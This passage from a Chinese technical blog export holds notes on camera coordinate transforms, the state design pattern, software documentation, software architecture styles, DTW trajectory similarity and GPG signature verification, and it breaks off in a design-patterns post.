<p>可以得到P点在相机坐标系下的坐标:<br>$$<br>\begin{bmatrix}<br>    X_c\<br>    Y_c\<br>    Z_c\<br>\end{bmatrix}<br>=<br>R<br>\begin{bmatrix}<br>    X_w\<br>    Y_w\<br>    Z_w\<br>\end{bmatrix}<br>+T<br>\Rightarrow<br>\begin{bmatrix}<br>    X_c\<br>    Y_c\<br>    Z_c\<br>    1\<br>\end{bmatrix}<br>=<br>\begin{bmatrix}<br>    R &amp; T\<br>    \vec{0} &amp; 1\<br>\end{bmatrix}<br>\begin{bmatrix}<br>    X_w\<br>    Y_w\<br>    Z_w\<br>    1\<br>\end{bmatrix}<br>,<br>R:3<em>3,T:3</em>1<br>$$</p>
<h2 id="相机坐标系到图像物理坐标系的转换"><a href="#相机坐标系到图像物理坐标系的转换" class="headerlink" title="相机坐标系到图像物理坐标系的转换"></a>相机坐标系到图像物理坐标系的转换</h2><p>从相机坐标系到图像坐标系，属于透视投影关系，从3D转换到2D。 也可以看成是针孔模型的变种。该转换满足三角形的相似定理，如图4所示。</p>
<p align="center">
    <img src="images/3dto2d.jpg" width="90%" alt="相机坐标系到图像物理坐标系的转换"/>
</p>
<center>图4 相机坐标系到图像物理坐标系的转换</center>

<h2 id="图像物理坐标系到像素坐标系的转换"><a href="#图像物理坐标系到像素坐标系的转换" class="headerlink" title="图像物理坐标系到像素坐标系的转换"></a>图像物理坐标系到像素坐标系的转换</h2><p>图像物理坐标系到像素坐标系的转换不涉及旋转变换，但是坐标原点位置不一致，大小不一致，涉及伸缩变换及平移变换，如图5所示。</p>
<p align="center">
    <img src="images/image2uv.jpg" width="90%" alt="图像物理坐标系到像素坐标系的转换"/>
</p>
<center>图5 图像物理坐标系到像素坐标系的转换</center>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>四个坐标系之间存在着下述关系 ( 矩阵依次左乘 )，如图6所示:</p>
<p align="center">
    <img src="images/summary1.jpg" width="90%" alt="世界坐标系到像素坐标系的转换"/>
</p>
<p align="center">
    <img src="images/summary2.jpg" width="90%"/>
</p>
<center>图6 世界坐标系到像素坐标系的转换</center>

<p>其中相机的内参和外参可以通过张正友标定获取。通过最终的转换关系来看，一个三维中的坐标点，的确可以在图像中找到一个对应的像素点，但是反过来，通过图像中的一个点找到它在三维中对应的点就很成了一个问题，因为我们并不知道等式左边的Z<sub>c</sub>的值。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/三维投影" target="_blank" rel="noopener">三维投影</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/Goncely/article/details/5397729" target="_blank" rel="noopener">透视投影的原理和实现</a>,by Goncely.</li>
<li><a href="https://blog.csdn.net/chentravelling/article/details/53558096" target="_blank" rel="noopener">计算机视觉：相机成像原理：世界坐标系、相机坐标系、图像坐标系、像素坐标系之间的转换</a>,by 生活没有if-else</li>
<li><a href="https://blog.csdn.net/lyl771857509/article/details/79633412" target="_blank" rel="noopener">【相机标定】四个坐标系之间的变换关系</a></li>
<li><a href="http://zhaoxuhui.top/blog/2018/03/18/Location&PoseEstimationInSLAM.html" target="_blank" rel="noopener">SLAM相机位姿估计(1)</a>,by Zhao xuhui.</li>
<li><a href="https://zhaoxuhui.top/blog/2018/03/08/%E5%8D%95%E7%9B%AESLAM%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80.html" target="_blank" rel="noopener">单目SLAM理论基础</a>,by Zhao xuhui.</li>
<li><a href="https://www.cnblogs.com/graphics/archive/2012/07/25/2582119.html" target="_blank" rel="noopener">透视投影详解</a>,by zdd.</li>
<li><a href="https://blog.csdn.net/csxiaoshui/article/details/65446125" target="_blank" rel="noopener">旋转变换（一）旋转矩阵</a>,by csxiaoshui.</li>
<li><a href="https://wiki.jikexueyuan.com/project/modern-opengl-tutorial/tutorial12.html" target="_blank" rel="noopener">第十二课 透视投影</a>,by 极客学院.</li>
<li><a href="https://ain-crad.github.io/2019/09/20/%E5%85%89%E6%A0%85%E5%8C%96%E6%B8%B2%E6%9F%93-6-%E9%80%8F%E8%A7%86%E6%8A%95%E5%BD%B1%E7%9F%A9%E9%98%B5/" target="_blank" rel="noopener">光栅化渲染-6-透视投影矩阵</a>,by Aincrad.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式之状态模式</title>
    <url>/2020/03/28/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>最近研究红外探测器建模仿真时，了解到它有多种工作状态，在不同工作状态下有不同的探测能力，很适合用设计模式中的状态模式进行建模仿真。因此，学习一下设计模式中行为型模式之状态模式。</p>
<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>在很多情况下，一个对象的行为取决于一个或多个动态变化的属性，这样的属性叫做状态，这样的对象叫做有状态的(stateful)对象，这样的对象状态是从事先定义好的一系列值中取出的。当一个这样的对象与外部事件产生互动时，其内部状态就会改变，从而使得系统的行为也随之发生变化。</p>
<p>在UML中可以使用状态图来描述对象状态的变化。</p>
<p>状态模式(State Pattern) ：允许一个对象在其内部状态改变时改变它的行为，对象看起来似乎修改了它的类。其别名为状态对象(Objects for States)，状态模式是一种对象行为型模式。</p>
<p>有限状态机（英语：finite-state machine，缩写：FSM）又称有限状态自动机（英语：finite-state automation，缩写：FSA），简称状态机，是表示有限个状态以及在这些状态之间的转移和动作等行为的数学计算模型。</p>
<p>状态存储关于过去的信息，就是说：它反映从系统开始到现在时刻的输入变化。转移指示状态变更，并且用必须满足确使转移发生的条件来描述它。动作是在给定时刻要进行的活动的描述。有多种类型的动作：</p>
<ul>
<li>进入动作（entry action）：在进入状态时进行</li>
<li>退出动作（exit action）：在退出状态时进行</li>
<li>输入动作：依赖于当前状态和输入条件进行</li>
<li>转移动作：在进行特定转移时进行</li>
</ul>
<p>Moore状态机：输出仅仅与当前状态有关；</p>
<p>Mealy状态机：输出不仅取决于当前状态，还和输入有关；</p>
<h1 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h1><p>状态模式包含如下角色：</p>
<ul>
<li>Context: 环境类</li>
<li>State: 抽象状态类</li>
<li>ConcreteState: 具体状态类</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2019/08/06/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%AE%80%E4%BB%8B/">软件设计模式简介</a>,by jackhuang.</li>
<li><a href="https://design-patterns.readthedocs.io/zh_CN/latest/behavioral_patterns/state.html" target="_blank" rel="noopener">图说设计模式-状态模式</a>,by me115.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E9%99%90%E7%8A%B6%E6%80%81%E6%9C%BA" target="_blank" rel="noopener">有限状态机</a>,by wikipedia.</li>
<li><a href="https://glumes.com/post/android/understand-state-machine/" target="_blank" rel="noopener">理解状态机</a>,by 纸上浅谈.</li>
<li><a href="https://www.jianshu.com/p/5eb45c64f3e3" target="_blank" rel="noopener">深入浅出理解有限状态机</a>,by 我是云峰小罗.</li>
<li><a href="http://www.ruanyifeng.com/blog/2013/09/finite-state_machine_for_javascript.html" target="_blank" rel="noopener">JavaScript与有限状态机</a>,by ruanyifeng.</li>
<li><a href="https://blog.csdn.net/Reborn_Lee/article/details/88918615" target="_blank" rel="noopener">Moore状态机和Mealy状态机的区别</a>,by Reborn Lee.</li>
<li><a href="https://zhuanlan.zhihu.com/p/431714886" target="_blank" rel="noopener">C++各类设计模式及实现详解</a>,by linux.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>软件开发文档的编写方法</title>
    <url>/2020/01/22/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3%E7%9A%84%E7%BC%96%E5%86%99%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>软件开发文档是软件开发过程的输出产物。软件开发过程的不同阶段将产生不同的软件开发文档。例如：软件需求分析阶段将产生软件需求规格说明书，软件概要设计阶段将产生概要设计说明书，软件详细设计阶段将产生详细设计说明书。按照软件工程的原则，软件开发过程输出这些文档的目的是为了保障软件开发的质量，确保软件项目能够按时完成，并保质保量。下面重点介绍各类软件开发文档的编写方法。</p>
<h1 id="软件过程模型"><a href="#软件过程模型" class="headerlink" title="软件过程模型"></a>软件过程模型</h1><p>软件过程模型是软件过程的简化表示。典型的软件过程模型有：瀑布模型、增量式开发模型和面向服用的软件工程模型。以瀑布模型为例，其涉及的开发活动如图1所示。</p>
<p align="center">
    <img src="images/waterfall.jpg" width="80%" alt="瀑布模型"/>
</p>
<center>图1 瀑布模型</center>

<p>各个开发活动对应产出的软件开发文档主要有：</p>
<ol>
<li>可行性研究报告</li>
<li>项目开发计划</li>
<li>软件需求说明书</li>
<li>概要设计说明书</li>
<li>详细设计说明书</li>
<li>数据库设计说明书</li>
<li>数据要求说明书</li>
<li>测试计划</li>
<li>测试分析报告</li>
<li>项目开发总结报告</li>
<li>操作手册</li>
<li>用户手册</li>
<li>开发进度月报</li>
</ol>
<h1 id="软件开发文档"><a href="#软件开发文档" class="headerlink" title="软件开发文档"></a>软件开发文档</h1><h2 id="可行性研究报告"><a href="#可行性研究报告" class="headerlink" title="可行性研究报告"></a>可行性研究报告</h2><p align="center">
    <img src="images/doc2.jpg" width="80%" alt="可行性研究报告"/>
</p>
<center>图2 可行性研究报告</center>

<h2 id="项目开发计划"><a href="#项目开发计划" class="headerlink" title="项目开发计划"></a>项目开发计划</h2><p align="center">
    <img src="images/doc3.jpg" width="80%" alt="项目开发计划"/>
</p>
<center>图3 项目开发计划</center>

<h2 id="软件需求说明书"><a href="#软件需求说明书" class="headerlink" title="软件需求说明书"></a>软件需求说明书</h2><p align="center">
    <img src="images/doc4.jpg" width="80%" alt="软件需求说明书"/>
</p>
<center>图4 软件需求说明书</center>

<h2 id="概要设计说明书"><a href="#概要设计说明书" class="headerlink" title="概要设计说明书"></a>概要设计说明书</h2><p align="center">
    <img src="images/doc5.jpg" width="80%" alt="概要设计说明书"/>
</p>
<center>图5 概要设计说明书</center>

<h2 id="详细设计说明书"><a href="#详细设计说明书" class="headerlink" title="详细设计说明书"></a>详细设计说明书</h2><p align="center">
    <img src="images/doc6.jpg" width="80%" alt="详细设计说明书"/>
</p>
<center>图6 详细设计说明书</center>

<h2 id="数据库设计说明书"><a href="#数据库设计说明书" class="headerlink" title="数据库设计说明书"></a>数据库设计说明书</h2><p align="center">
    <img src="images/doc7.jpg" width="80%" alt="数据库设计说明书"/>
</p>
<center>图7 数据库设计说明书</center>

<h2 id="数据要求说明书"><a href="#数据要求说明书" class="headerlink" title="数据要求说明书"></a>数据要求说明书</h2><p align="center">
    <img src="images/doc8.jpg" width="80%" alt="数据要求说明书"/>
</p>
<center>图8 数据要求说明书</center>

<h2 id="测试计划"><a href="#测试计划" class="headerlink" title="测试计划"></a>测试计划</h2><p align="center">
    <img src="images/doc9.jpg" width="80%" alt="测试计划"/>
</p>
<center>图9 测试计划</center>

<h2 id="测试分析报告"><a href="#测试分析报告" class="headerlink" title="测试分析报告"></a>测试分析报告</h2><p align="center">
    <img src="images/doc10.jpg" width="80%" alt="测试分析报告"/>
</p>
<center>图10 测试分析报告</center>

<h2 id="项目开发总结报告"><a href="#项目开发总结报告" class="headerlink" title="项目开发总结报告"></a>项目开发总结报告</h2><p align="center">
    <img src="images/doc11.jpg" width="80%" alt="项目开发总结报告"/>
</p>
<center>图11 项目开发总结报告</center>

<h2 id="操作手册"><a href="#操作手册" class="headerlink" title="操作手册"></a>操作手册</h2><p align="center">
    <img src="images/doc12.jpg" width="80%" alt="操作手册"/>
</p>
<center>图12 操作手册</center>

<h2 id="用户手册"><a href="#用户手册" class="headerlink" title="用户手册"></a>用户手册</h2><p align="center">
    <img src="images/doc13.jpg" width="80%" alt="用户手册"/>
</p>
<center>图13 用户手册</center>

<h1 id="软件开发文档的使用"><a href="#软件开发文档的使用" class="headerlink" title="软件开发文档的使用"></a>软件开发文档的使用</h1><h2 id="软件文档分类"><a href="#软件文档分类" class="headerlink" title="软件文档分类"></a>软件文档分类</h2><p align="center">
    <img src="images/doc14.jpg" width="80%" alt="软件文档分类"/>
</p>
<center>图14 软件文档分类</center>

<h2 id="软件文档读者"><a href="#软件文档读者" class="headerlink" title="软件文档读者"></a>软件文档读者</h2><p align="center">
    <img src="images/doc15.jpg" width="80%" alt="软件文档读者"/>
</p>
<center>图15 软件文档读者</center>

<h2 id="软件文档使用"><a href="#软件文档使用" class="headerlink" title="软件文档使用"></a>软件文档使用</h2><p align="center">
    <img src="images/doc16.jpg" width="80%" alt="软件文档使用"/>
</p>
<center>图16 软件文档使用</center>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B" target="_blank" rel="noopener">软件工程</a>,by wikipedia.</li>
<li><a href="https://www.jianshu.com/p/a52fe78962f0" target="_blank" rel="noopener">软件需求，概要设计，详细设计（文档）怎么做，做什么？</a>,by 安东尼_Anthony.</li>
<li><a href="http://www.ishenping.com/ArtInfo/3704232.html" target="_blank" rel="noopener">软件工程文档总结</a>,by BONIC.</li>
<li><a href="https://blog.csdn.net/iamlaosong/article/details/17304697" target="_blank" rel="noopener">国标：计算机软件文档编制规范</a>,by 宋哥.</li>
<li><a href="https://www.cnblogs.com/TomBombadil/p/11122452.html" target="_blank" rel="noopener">软件测试流程</a>,by HenryZ.Tang.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>软件架构的一些思考</title>
    <url>/2019/01/25/%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<p>以前对软件架构总是雾里看花，似懂非懂，最近好像有点悟了，赶紧记录一下。</p>
<h1 id="软件架构的定义（What）"><a href="#软件架构的定义（What）" class="headerlink" title="软件架构的定义（What）"></a>软件架构的定义（What）</h1><p><strong>软件架构是有关软件整体结构与组件的抽象描述，用于指导大型软件系统各个方面的设计</strong><sup>[1]</sup>。</p>
<p>软件体系结构是构建计算机软件实践的基础。与建筑师设定建筑项目的设计原则和目标，作为绘图员画图的基础一样，软件架构师或者系统架构师陈述软件架构以作为满足不同客户需求的实际系统设计方案的基础。从和目的、主题、材料和结构的联系上来说，软件架构可以和建筑物的架构相比拟。一个软件架构师需要有广泛的软件理论知识和相应的经验来实施和管理软件产品的高级设计。软件架构师定义和设计软件的模块化，模块之间的交互，用户界面风格，对外接口方法，创新的设计特性，以及高层事物的对象操作、逻辑和流程。</p>
<h1 id="软件架构的意义（Why）"><a href="#软件架构的意义（Why）" class="headerlink" title="软件架构的意义（Why）"></a>软件架构的意义（Why）</h1><p>软件架构是一个系统的草图。软件架构描述的对象是直接构成系统的抽象组件。各个组件之间的连接则明确和相对细致地描述组件之间的通讯。在实现阶段，这些抽象组件被细化为实际的组件，比如具体某个类或者对象。在面向对象领域中，组件之间的连接通常用接口来实现。</p>
<p>软件架构是软件架构师与项目干系人沟通的工具。例如：软件架构师与客户商谈概念上的事情，与经理商谈广泛的设计问题，与软件工程师商谈创新的结构特性，与程序员商谈实现技巧，外观和风格。</p>
<h1 id="软件架构的选择（How）"><a href="#软件架构的选择（How）" class="headerlink" title="软件架构的选择（How）"></a>软件架构的选择（How）</h1><p><strong>用户需求决定软件架构的选择</strong>。用户需求可分成功能性需求和非功能性需求。功能性需求即用户要求软件产品应实现什么样的功能，非功能性需求即用户要求软件产品的质量属性达到一定标准。以开发一个购物网站为例，用户要求实现商品展示功能、购物车功能即功能性需求，用户要求在1秒内打开购物网站、网站平均无故障时间是一个月即非功能性需求。<strong>通常用户的非功能性需求对软件架构产生决定性影响</strong>。</p>
<h2 id="常见的软件架构"><a href="#常见的软件架构" class="headerlink" title="常见的软件架构"></a>常见的软件架构</h2><h3 id="分层架构"><a href="#分层架构" class="headerlink" title="分层架构"></a>分层架构</h3><p>分层架构（layered architecture）是最常见的软件架构，也是事实上的标准架构。如果你不知道要用什么架构，那就用它。</p>
<p>这种架构将软件分成若干个水平层，每一层都有清晰的角色和分工，不需要知道其他层的细节。层与层之间通过接口通信。</p>
<p>虽然没有明确约定，软件一定要分成多少层，但是四层的结构最常见:</p>
<ul>
<li>表现层（presentation）：用户界面，负责视觉和用户互动</li>
<li>业务层（business）：实现业务逻辑</li>
<li>持久层（persistence）：提供数据，SQL 语句就放在这一层</li>
<li>数据库（database） ：保存数据</li>
</ul>
<h3 id="事件驱动架构"><a href="#事件驱动架构" class="headerlink" title="事件驱动架构"></a>事件驱动架构</h3><p>事件（event）是状态发生变化时，软件发出的通知。</p>
<p>事件驱动架构（event-driven architecture）就是通过事件进行通信的软件架构。它分成四个部分。</p>
<ul>
<li>事件队列（event queue）：接收事件的入口</li>
<li>分发器（event mediator）：将不同的事件分发到不同的业务逻辑单元</li>
<li>事件通道（event channel）：分发器与处理器之间的联系渠道</li>
<li>事件处理器（event processor）：实现业务逻辑，处理完成后会发出事件，触发下一步操作</li>
</ul>
<h3 id="微核架构"><a href="#微核架构" class="headerlink" title="微核架构"></a>微核架构</h3><p>微核架构（microkernel architecture）又称为”插件架构”（plug-in architecture），指的是软件的内核相对较小，主要功能和业务逻辑都通过插件实现。</p>
<p>内核（core）通常只包含系统运行的最小功能。插件则是互相独立的，插件之间的通信，应该减少到最低，避免出现互相依赖的问题。</p>
<h3 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h3><p>微服务架构（microservices architecture）是服务导向架构（service-oriented architecture，缩写 SOA）的升级。</p>
<p>每一个服务就是一个独立的部署单元（separately deployed unit）。这些单元都是分布式的，互相解耦，通过远程通信协议（比如REST、SOAP）联系。</p>
<p>微服务架构分成三种实现模式。</p>
<ul>
<li>RESTful API 模式：服务通过 API 提供，云服务就属于这一类</li>
<li>RESTful 应用模式：服务通过传统的网络协议或者应用协议提供，背后通常是一个多功能的应用程序，常见于企业内部</li>
<li>集中消息模式：采用消息代理（message broker），可以实现消息队列、负载均衡、统一日志和异常处理，缺点是会出现单点失败，消息代理可能要做成集群</li>
</ul>
<h3 id="云架构"><a href="#云架构" class="headerlink" title="云架构"></a>云架构</h3><p>云结构（cloud architecture）主要解决扩展性和并发的问题，是最容易扩展的架构。</p>
<p>它的高扩展性，主要原因是没使用中央数据库，而是把数据都复制到内存中，变成可复制的内存数据单元。然后，业务处理能力封装成一个个处理单元（prcessing unit）。访问量增加，就新建处理单元；访问量减少，就关闭处理单元。由于没有中央数据库，所以扩展性的最大瓶颈消失了。由于每个处理单元的数据都在内存里，最好要进行数据持久化。</p>
<p>这个模式主要分成两部分：处理单元（processing unit）和虚拟中间件（virtualized middleware）。</p>
<ul>
<li>处理单元：实现业务逻辑</li>
<li>虚拟中间件：负责通信、保持sessions、数据复制、分布式处理、处理单元的部署。</li>
</ul>
<p>虚拟中间件又包含四个组件。</p>
<ul>
<li>消息中间件（Messaging Grid）：管理用户请求和session，当一个请求进来以后，决定分配给哪一个处理单元。</li>
<li>数据中间件（Data Grid）：将数据复制到每一个处理单元，即数据同步。保证某个处理单元都得到同样的数据。</li>
<li>处理中间件（Processing Grid）：可选，如果一个请求涉及不同类型的处理单元，该中间件负责协调处理单元</li>
<li>部署中间件（Deployment Manager）：负责处理单元的启动和关闭，监控负载和响应时间，当负载增加，就新启动处理单元，负载减少，就关闭处理单元。</li>
</ul>
<h3 id="客户端-服务器架构"><a href="#客户端-服务器架构" class="headerlink" title="客户端/服务器架构"></a>客户端/服务器架构</h3><p>这种架构由两部分组成：一个服务器和多个客户端。服务器组件将为多个客户端组件提供服务。客户端从服务器请求服务，服务器为这些客户端提供相关服务。此外，服务器持续侦听客户机请求。</p>
<h3 id="模型-视图-控制器架构"><a href="#模型-视图-控制器架构" class="headerlink" title="模型/视图/控制器架构"></a>模型/视图/控制器架构</h3><p>这种架构，也称为MVC模式，把一个交互式应用程序划分为3个部分，</p>
<ul>
<li>模型：包含核心功能和数据</li>
<li>视图：将信息显示给用户(可以定义多个视图)</li>
<li>控制器：处理用户输入的信息</li>
</ul>
<p>这样做是为了将信息的内部表示与信息的呈现方式分离开来，并接受用户的请求。它分离了组件，并允许有效的代码重用。</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/软件架构" target="_blank" rel="noopener">软件架构</a>,by wikipedia.</li>
<li><a href="http://www.ruanyifeng.com/blog/2016/09/software-architecture.html" target="_blank" rel="noopener">软件架构入门</a>,by 阮一峰.</li>
<li><a href="https://www.cnblogs.com/IcanFixIt/p/7518146.html" target="_blank" rel="noopener">10种常见的软件架构模式</a>,by 尽信书不如无书.</li>
<li><a href="https://zh.wikipedia.org/zh-hans/MVC" target="_blank" rel="noopener">MVC</a>,by wikipedia.</li>
<li><a href="https://www.jianshu.com/p/b477b2cc6cfa" target="_blank" rel="noopener">1.软件架构编年史(译)</a>,by qinyu.</li>
<li><a href="https://zhuanlan.zhihu.com/p/59814282" target="_blank" rel="noopener">MVC MVP MVVM Redux 架构介绍</a>,by 吃货要健康.</li>
<li><a href="https://www.cnblogs.com/aspwebchh/p/8853659.html" target="_blank" rel="noopener">深入理解MVC</a>,by 陈宏鸿.</li>
<li><a href="https://zhuanlan.zhihu.com/p/59467370" target="_blank" rel="noopener">什么是MVVM框架？</a>,by siki学院.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>轨迹相似度度量方法总结</title>
    <url>/2019/06/10/%E8%BD%A8%E8%BF%B9%E7%9B%B8%E4%BC%BC%E5%BA%A6%E5%BA%A6%E9%87%8F%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>轨迹相似度度量有广泛的用途，如语音识别分类、模板匹配、信息检索等。下面介绍各种轨迹相似度度量方法。</p>
<h1 id="轨迹定义"><a href="#轨迹定义" class="headerlink" title="轨迹定义"></a>轨迹定义</h1><p>轨迹可由时间域到空间域的映射函数表示，如：</p>
<p>$$t\stackrel{F}{\longrightarrow}R^d, d&gt;1$$</p>
<h1 id="度量方法"><a href="#度量方法" class="headerlink" title="度量方法"></a>度量方法</h1><p>轨迹相似度度量方法主要有：</p>
<ul>
<li><p>基于点方法： EDR，LCSS，DTW等</p>
</li>
<li><p>基于形状的方法： Frechet， Hausdorff</p>
</li>
<li><p>基于分段的方法：One Way Distance, LIP distance</p>
</li>
<li><p>基于特定任务的方法：TRACLUS， Road Network，grid等</p>
</li>
</ul>
<h2 id="基于点的方法"><a href="#基于点的方法" class="headerlink" title="基于点的方法"></a>基于点的方法</h2><h3 id="DTW"><a href="#DTW" class="headerlink" title="DTW"></a>DTW</h3><p>DTW（Dynamic Time Warping, 动态时间规整）可以计算两个时间序列的相似度，尤其适用于不同长度、不同节奏的时间序列（比如不同的人读同一个词的音频序列）。DTW将自动warping扭曲 时间序列（即在时间轴上进行局部的缩放），使得两个序列的形态尽可能的一致，得到最大可能的相似度。</p>
<p>Dynamic Time Warping（DTW）诞生有一定的历史了（日本学者Itakura提出），它出现的目的也比较单纯，是一种衡量两个长度不同的时间序列的相似度的方法。应用也比较广，主要是在模板匹配中，比如说用在孤立词语音识别（识别两段语音是否表示同一个单词），手势识别，数据挖掘和信息检索等中。</p>
<p>设 $P=&lt;p_1,p_2,…,p_m&gt;$ 和 $Q=&lt;q_1,q_2,…,q_n&gt;$ 是两个时间序列，则 $P$ 和 $Q$的距离 $DTW(P,Q)$ 定义如下：</p>
<p>$$DTW(P,Q)= \left{<br>\begin{array}{lcl}<br>0     &amp;   &amp;if\ m=n=0\<br>\infty &amp;   &amp;if\ m=0\ or\ n=0\<br>dist(p_1,q_1)+min<br>    \left{<br>    \begin{aligned}<br>            DTW(Rest(P),Rest(Q))\<br>            DTW(Rest(P),Q)\<br>            DTW(P,Rest(Q))\<br>    \end{aligned}<br>    \right} &amp; &amp; otherwise<br>\end{array}<br>\right.<br>$$</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.zhihu.com/question/27213170" target="_blank" rel="noopener">如何判断两条轨迹（或曲线）的相似度？</a>,by zhihu.</li>
<li><a href="https://zhuanlan.zhihu.com/p/43247215" target="_blank" rel="noopener">动态时间规整（DTW）算法简介</a>,by 文均.</li>
<li><a href="https://zhuanlan.zhihu.com/p/32849741" target="_blank" rel="noopener">DTW(Dynamic Time Warping)动态时间规整</a>,by X-猪.</li>
<li><a href="https://www.cnblogs.com/luxiaoxun/archive/2013/05/09/3069036.html" target="_blank" rel="noopener">Dynamic Time Warping 动态时间规整算法</a>,by 阿凡卢.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>软件签名验证的方法</title>
    <url>/2021/05/26/%E8%BD%AF%E4%BB%B6%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>GNU Privacy Guard（GnuPG或GPG）是一个密码学软件，用于加密、签名通信内容及管理非对称密码学的密钥。GnuPG是自由软件，遵循IETF订定的OpenPGP技术标准设计，并与PGP保持兼容。</p>
<h1 id="安装-GnuPG"><a href="#安装-GnuPG" class="headerlink" title="安装 GnuPG"></a>安装 GnuPG</h1><p>对于 Windows 的用户：</p>
<p>如果您使用 Windows， 下载 Gpg4win并运行其安装包。</p>
<p>为了验证签名，您需要在 Windows 命令行（“cmd.exe”）中输入一些命令。</p>
<p>对于 macOS 的用户：</p>
<p>如果您正在使用 macOS，您可以安装 GPGTools。</p>
<p>为了验证签名，您需要在（“应用程序”下的）终端中输入一些命令</p>
<p>对于 GNU/Linux 的用户：</p>
<p>如果你使用 GNU/Linux，那么可能在你的系统中已经安装了 GnuPG，因为大多数 Linux 发行版都预装了它。</p>
<h1 id="使用GnuPG"><a href="#使用GnuPG" class="headerlink" title="使用GnuPG"></a>使用GnuPG</h1><h2 id="生成密钥对"><a href="#生成密钥对" class="headerlink" title="生成密钥对"></a>生成密钥对</h2><p>GnuPG使用非对称密码体制算法生成一对密钥对，其中公钥可公开，私钥必须保密。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpg --gen-key</span><br></pre></td></tr></table></figure>

<h2 id="验证软件签名"><a href="#验证软件签名" class="headerlink" title="验证软件签名"></a>验证软件签名</h2><p>验证下载文件的第一步是与任何提供文件下载的人建立信任。出于此，需要下载这个文件的公钥，并且验证公钥的拥有者是否是他或者她自称的。</p>
<p>在下载完文件拥有者的公钥后，使用 gpg 命令导入公钥到你的 keyring 中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gpg --import signing-key.asc</span><br><span class="line">gpg --fingerprint 3DBDC284</span><br><span class="line">gpg --edit-key 3DBDC284</span><br><span class="line">gpg --list-keys</span><br><span class="line">gpg --verify openSUSE-Tumbleweed-DVD-x86_64-Snapshot20170529-Media.iso.sha256</span><br><span class="line">gpg --verify file.ext.asc file.ext</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.ruanyifeng.com/blog/2013/07/gpg.html" target="_blank" rel="noopener">GPG入门教程</a>,by 阮一峰.</li>
<li><a href="https://blog.chaos.run/dreams/gpg-verify/" target="_blank" rel="noopener">利用 GPG 签名验证文件的完整及可靠性</a>,by Silearner.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>软件设计模式简介</title>
    <url>/2019/08/06/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>软件模式是将模式的一般概念应用于软件开发领域，即软件开发的 总体指导思路或参照样板。软件模式并非仅限于设计模式，还包括 架构模式、分析模式和过程模式等，实际上，在软件生存期的每一个阶段都存在着一些被认同的模式。下面重点介绍各种经典的设计模式。</p>
<h1 id="创建型模式"><a href="#创建型模式" class="headerlink" title="创建型模式"></a>创建型模式</h1><h2 id="简单工厂模式-Simple-Factory-Pattern"><a href="#简单工厂模式-Simple-Factory-Pattern" class="headerlink" title="简单工厂模式( Simple Factory Pattern )"></a>简单工厂模式( Simple Factory Pattern )</h2><h2 id="工厂方法模式-Factory-Method-Pattern"><a href="#工厂方法模式-Factory-Method-Pattern" class="headerlink" title="工厂方法模式(Factory Method Pattern)"></a>工厂方法模式(Factory Method Pattern)</h2><h2 id="抽象工厂模式-Abstract-Factory"><a href="#抽象工厂模式-Abstract-Factory" class="headerlink" title="抽象工厂模式(Abstract Factory)"></a>抽象工厂模式(Abstract Factory)</h2><h2 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h2><h2 id="单例模式"><a href="#单例模式" class="headerlink" 